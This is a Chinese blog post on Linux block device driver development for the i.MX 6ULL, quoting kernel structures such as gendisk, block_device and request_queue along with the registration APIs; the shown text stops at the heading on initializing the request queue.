<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>i.MX 6ULL 驱动开发 二十七：块设备 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">i.MX 6ULL 驱动开发 二十七：块设备</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <p>参考：<a href="https://aliez22.github.io/posts/11537/">【块设备】通用块层 struct bio 详解 | zzm (aliez22.github.io)</a></p> 
<h1>
<a id="Linux__3"></a>一、Linux 中块设备驱动框架</h1> 
<p><img src="https://images2.imgbox.com/78/a8/abyPD1vA_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="_5"></a>二、块设备基本概念</h1> 
<p>1、<strong>扇区</strong>的概念来自<strong>硬件</strong>，扇区是<strong>硬件</strong>最小操作单位。</p> 
<p>2、<strong>块</strong>的概念来自<strong>文件系统</strong>，是<strong>文件系统数据</strong>处理的最小单位。</p> 
<p>3、<strong>段</strong>的概念来自<strong>操作系统</strong>，是内核对<strong>内存管理机制</strong>的最小单位。</p> 
<p>4、<strong>页</strong>的概念来自<strong>操作系统</strong>，是内核<strong>内存映射管理</strong>的最小单位。</p> 
<h1>
<a id="_15"></a>三、磁盘分区相关概念</h1> 
<p><a href="https://www.cnblogs.com/straybirds/p/14716957.html">硬盘分区的相关概念（主分区，扩展分区，逻辑分区，MBR，DBR） - 假程序猿 - 博客园 (cnblogs.com)</a></p> 
<h1>
<a id="_19"></a>四、块设备驱动框架中几个重要对象</h1> 
<h2>
<a id="1_21"></a>1、逻辑块设备</h2> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token punctuation">{<!-- --></span>
	<span class="token class-name">dev_t</span>			bd_dev<span class="token punctuation">;</span>  <span class="token comment">/* not a kdev_t - it's a search key */</span>
	<span class="token keyword">int</span>			bd_openers<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>		bd_inode<span class="token punctuation">;</span>	<span class="token comment">/* will die */</span>
	<span class="token keyword">struct</span> <span class="token class-name">super_block</span> <span class="token operator">*</span>	bd_super<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">mutex</span>		bd_mutex<span class="token punctuation">;</span>	<span class="token comment">/* open/close mutex */</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	bd_inodes<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>			bd_claiming<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>			bd_holder<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			bd_holders<span class="token punctuation">;</span>
	bool			bd_write_holder<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SYSFS</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	bd_holder_disks<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>	bd_contains<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span>		bd_block_size<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">hd_struct</span> <span class="token operator">*</span>	bd_part<span class="token punctuation">;</span>
	<span class="token comment">/* number of times partitions within this device have been opened. */</span>
	<span class="token keyword">unsigned</span>		bd_part_count<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			bd_invalidated<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>	bd_disk<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>  bd_queue<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	bd_list<span class="token punctuation">;</span>
	<span class="token comment">/*
	 * Private data.  You must have bd_claim'ed the block_device
	 * to use this.  NOTE:  bd_claim allows an owner to claim
	 * the same device multiple times, the owner must take special
	 * care to not mess up bd_private for that case.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span>		bd_private<span class="token punctuation">;</span>

	<span class="token comment">/* The counter of freeze processes */</span>
	<span class="token keyword">int</span>			bd_fsfreeze_count<span class="token punctuation">;</span>
	<span class="token comment">/* Mutex for freeze */</span>
	<span class="token keyword">struct</span> <span class="token class-name">mutex</span>		bd_fsfreeze_mutex<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p>1、块设备注册</p> 
<pre><code class="prism language-c"><span class="token comment">/**
 * register_blkdev - register a new block device
 *
 * @major: the requested major device number [1..255]. If @major=0, try to
 *         allocate any unused major number.
 * @name: the name of the new block device as a zero terminated string
 *
 * The @name must be unique within the system.
 *
 * The return value depends on the @major input parameter.
 *  - if a major device number was requested in range [1..255] then the
 *    function returns zero on success, or a negative error code
 *  - if any unused major number was requested with @major=0 parameter
 *    then the return value is the allocated major number in range
 *    [1..255] or a negative error code otherwise
 */</span>
<span class="token keyword">int</span> <span class="token function">register_blkdev</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> major<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span>
</code></pre> 
<p>2、块设备注销</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">unregister_blkdev</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> major<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span>
</code></pre> 
<h2>
<a id="2_90"></a>2、实际块设备</h2> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">/* major, first_minor and minors are input parameters only,
	 * don't use directly.  Use disk_devt() and disk_max_parts().
	 */</span>
	<span class="token keyword">int</span> major<span class="token punctuation">;</span>			<span class="token comment">/* major number of driver */</span>
	<span class="token keyword">int</span> first_minor<span class="token punctuation">;</span>
	<span class="token keyword">int</span> minors<span class="token punctuation">;</span>                     <span class="token comment">/* maximum number of minors, =1 for
                                         * disks that can't be partitioned. */</span>

	<span class="token keyword">char</span> disk_name<span class="token punctuation">[</span>DISK_NAME_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment">/* name of major driver */</span>
	<span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>devnode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>gd<span class="token punctuation">,</span> <span class="token class-name">umode_t</span> <span class="token operator">*</span>mode<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> events<span class="token punctuation">;</span>		<span class="token comment">/* supported events */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> async_events<span class="token punctuation">;</span>	<span class="token comment">/* async events, subset of all */</span>

	<span class="token comment">/* Array of pointers to partitions indexed by partno.
	 * Protected with matching bdev lock but stat and other
	 * non-critical accesses use RCU.  Always access through
	 * helpers.
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">disk_part_tbl</span> __rcu <span class="token operator">*</span>part_tbl<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">hd_struct</span> part0<span class="token punctuation">;</span>

	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">block_device_operations</span> <span class="token operator">*</span>fops<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>queue<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>private_data<span class="token punctuation">;</span>

	<span class="token keyword">int</span> flags<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>driverfs_dev<span class="token punctuation">;</span>  <span class="token comment">// FIXME: remove</span>
	<span class="token keyword">struct</span> <span class="token class-name">kobject</span> <span class="token operator">*</span>slave_dir<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">timer_rand_state</span> <span class="token operator">*</span>random<span class="token punctuation">;</span>
	<span class="token class-name">atomic_t</span> sync_io<span class="token punctuation">;</span>		<span class="token comment">/* RAID */</span>
	<span class="token keyword">struct</span> <span class="token class-name">disk_events</span> <span class="token operator">*</span>ev<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span>  <span class="token expression">CONFIG_BLK_DEV_INTEGRITY</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_integrity</span> <span class="token operator">*</span>integrity<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token keyword">int</span> node_id<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p>1、申请 <code>gendisk</code></p> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span><span class="token function">alloc_disk</span><span class="token punctuation">(</span><span class="token keyword">int</span> minors<span class="token punctuation">)</span>
</code></pre> 
<p>2、删除 <code>gendisk</code></p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">del_gendisk</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">)</span>
</code></pre> 
<p>3、将 <code>gendisk</code> 添加到内核</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">add_disk</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">)</span>
</code></pre> 
<p>4、设置 <code>gendisk</code> 容量</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">set_capacity</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">,</span> <span class="token class-name">sector_t</span> size<span class="token punctuation">)</span>
</code></pre> 
<p>5、调整 <code>gendisk</code> 引用计数</p> 
<pre><code class="prism language-c">truct kobject <span class="token operator">*</span><span class="token function">get_disk</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">)</span>
<span class="token keyword">void</span> <span class="token function">put_disk</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">)</span>
</code></pre> 
<h2>
<a id="3block_device__gendisk__167"></a>3、block_device 和 gendisk 区别</h2> 
<p><img src="https://images2.imgbox.com/2f/df/xVOYgQrN_o.png" alt="在这里插入图片描述"><br> <code>struct block_device</code>：用来描述一个块设备或者块设备的一个分区。与<strong>文件系统</strong>关系密切。</p> 
<p><code>struct gendisk</code>：描述整个块设备的特性。<strong>块设备驱动程序的主要操作对象</strong>。</p> 
<p>对于一个包含多个分区的块设备，<code>struct block_device</code> 结构有多个，而 <code>struct gendisk</code> 结构只有一个。</p> 
<h2>
<a id="4_175"></a>4、块设备操作集</h2> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">block_device_operations</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">fmode_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">fmode_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>rw_page<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">sector_t</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span> rw<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>ioctl<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">fmode_t</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>compat_ioctl<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">fmode_t</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">long</span> <span class="token punctuation">(</span><span class="token operator">*</span>direct_access<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">sector_t</span><span class="token punctuation">,</span>
					<span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>pfn<span class="token punctuation">,</span> <span class="token keyword">long</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>check_events<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">,</span>
				      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> clearing<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* -&gt;media_changed() is DEPRECATED, use -&gt;check_events() instead */</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>media_changed<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>unlock_native_capacity<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>revalidate_disk<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>getgeo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">hd_geometry</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* this callback is with swap_lock and sometimes page table lock held */</span>
	<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>swap_slot_free_notify<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="5_199"></a>5、请求队列</h2> 
<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">/*
	 * Together with queue_head for cacheline sharing
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	queue_head<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request</span>		<span class="token operator">*</span>last_merge<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">elevator_queue</span>	<span class="token operator">*</span>elevator<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			nr_rqs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment">/* # allocated [a]sync rqs */</span>
	<span class="token keyword">int</span>			nr_rqs_elvpriv<span class="token punctuation">;</span>	<span class="token comment">/* # allocated rqs w/ elvpriv */</span>

	<span class="token comment">/*
	 * If blkcg is not used, @q-&gt;root_rl serves all requests.  If blkcg
	 * is used, root blkg allocates from @q-&gt;root_rl and all other
	 * blkgs from their own blkg-&gt;rl.  Which one to use should be
	 * determined using bio_request_list().
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">request_list</span>	root_rl<span class="token punctuation">;</span>

	request_fn_proc		<span class="token operator">*</span>request_fn<span class="token punctuation">;</span>
	make_request_fn		<span class="token operator">*</span>make_request_fn<span class="token punctuation">;</span>
	prep_rq_fn		<span class="token operator">*</span>prep_rq_fn<span class="token punctuation">;</span>
	unprep_rq_fn		<span class="token operator">*</span>unprep_rq_fn<span class="token punctuation">;</span>
	merge_bvec_fn		<span class="token operator">*</span>merge_bvec_fn<span class="token punctuation">;</span>
	softirq_done_fn		<span class="token operator">*</span>softirq_done_fn<span class="token punctuation">;</span>
	rq_timed_out_fn		<span class="token operator">*</span>rq_timed_out_fn<span class="token punctuation">;</span>
	dma_drain_needed_fn	<span class="token operator">*</span>dma_drain_needed<span class="token punctuation">;</span>
	lld_busy_fn		<span class="token operator">*</span>lld_busy_fn<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">blk_mq_ops</span>	<span class="token operator">*</span>mq_ops<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		<span class="token operator">*</span>mq_map<span class="token punctuation">;</span>

	<span class="token comment">/* sw queues */</span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_mq_ctx</span> __percpu	<span class="token operator">*</span>queue_ctx<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_queues<span class="token punctuation">;</span>

	<span class="token comment">/* hw dispatch queues */</span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_mq_hw_ctx</span>	<span class="token operator">*</span><span class="token operator">*</span>queue_hw_ctx<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_hw_queues<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * Dispatch queue sorting
	 */</span>
	<span class="token class-name">sector_t</span>		end_sector<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request</span>		<span class="token operator">*</span>boundary_rq<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * Delayed queue handling
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">delayed_work</span>	delay_work<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">backing_dev_info</span>	backing_dev_info<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * The queue owner gets to use this for whatever they like.
	 * ll_rw_blk doesn't touch it.
	 */</span>
	<span class="token keyword">void</span>			<span class="token operator">*</span>queuedata<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * various queue flags, see QUEUE_* below
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span>		queue_flags<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * ida allocated id for this queue.  Used to index queues from
	 * ioctx.
	 */</span>
	<span class="token keyword">int</span>			id<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * queue needs bounce pages for pages above this limit
	 */</span>
	<span class="token class-name">gfp_t</span>			bounce_gfp<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * protects queue structures from reentrancy. -&gt;__queue_lock should
	 * _never_ be used directly, it is queue private. always use
	 * -&gt;queue_lock.
	 */</span>
	<span class="token class-name">spinlock_t</span>		__queue_lock<span class="token punctuation">;</span>
	<span class="token class-name">spinlock_t</span>		<span class="token operator">*</span>queue_lock<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * queue kobject
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">kobject</span> kobj<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * mq queue kobject
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">kobject</span> mq_kobj<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_PM</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">device</span>		<span class="token operator">*</span>dev<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			rpm_status<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_pending<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

	<span class="token comment">/*
	 * queue settings
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span>		nr_requests<span class="token punctuation">;</span>	<span class="token comment">/* Max # of requests */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_congestion_on<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_congestion_off<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_batching<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		dma_drain_size<span class="token punctuation">;</span>
	<span class="token keyword">void</span>			<span class="token operator">*</span>dma_drain_buffer<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		dma_pad_mask<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		dma_alignment<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">blk_queue_tag</span>	<span class="token operator">*</span>queue_tags<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	tag_busy_list<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_sorted<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		in_flight<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token comment">/*
	 * Number of active block driver functions for which blk_drain_queue()
	 * must wait. Must be incremented around functions that unlock the
	 * queue_lock internally, e.g. scsi_request_fn().
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		request_fn_active<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		rq_timeout<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">timer_list</span>	timeout<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	timeout_list<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	icq_list<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_BLK_CGROUP</span></span>
	<span class="token function">DECLARE_BITMAP</span>		<span class="token punctuation">(</span>blkcg_pols<span class="token punctuation">,</span> BLKCG_MAX_POLS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">blkcg_gq</span>		<span class="token operator">*</span>root_blkg<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	blkg_list<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

	<span class="token keyword">struct</span> <span class="token class-name">queue_limits</span>	limits<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * sg stuff
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		sg_timeout<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		sg_reserved_size<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			node<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_BLK_DEV_IO_TRACE</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_trace</span>	<span class="token operator">*</span>blk_trace<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token comment">/*
	 * for flush operations
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		flush_flags<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		flush_not_queueable<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">blk_flush_queue</span>	<span class="token operator">*</span>fq<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	requeue_list<span class="token punctuation">;</span>
	<span class="token class-name">spinlock_t</span>		requeue_lock<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">work_struct</span>	requeue_work<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">mutex</span>		sysfs_lock<span class="token punctuation">;</span>

	<span class="token keyword">int</span>			bypass_depth<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			mq_freeze_depth<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token function">defined</span><span class="token punctuation">(</span>CONFIG_BLK_DEV_BSG<span class="token punctuation">)</span></span></span>
	bsg_job_fn		<span class="token operator">*</span>bsg_job_fn<span class="token punctuation">;</span>
	<span class="token keyword">int</span>			bsg_job_size<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">bsg_class_device</span> bsg_dev<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_BLK_DEV_THROTTLING</span></span>
	<span class="token comment">/* Throttle data */</span>
	<span class="token keyword">struct</span> <span class="token class-name">throtl_data</span> <span class="token operator">*</span>td<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token keyword">struct</span> <span class="token class-name">rcu_head</span>		rcu_head<span class="token punctuation">;</span>
	<span class="token class-name">wait_queue_head_t</span>	mq_freeze_wq<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">percpu_ref</span>	mq_usage_counter<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	all_q_node<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">blk_mq_tag_set</span>	<span class="token operator">*</span>tag_set<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">list_head</span>	tag_set_list<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p><code>request_queue</code> 对象表示针对一个 <code>gendisk</code> 对象的所有请求的队列。</p> 
<p>1、初始化请求队列</p> 
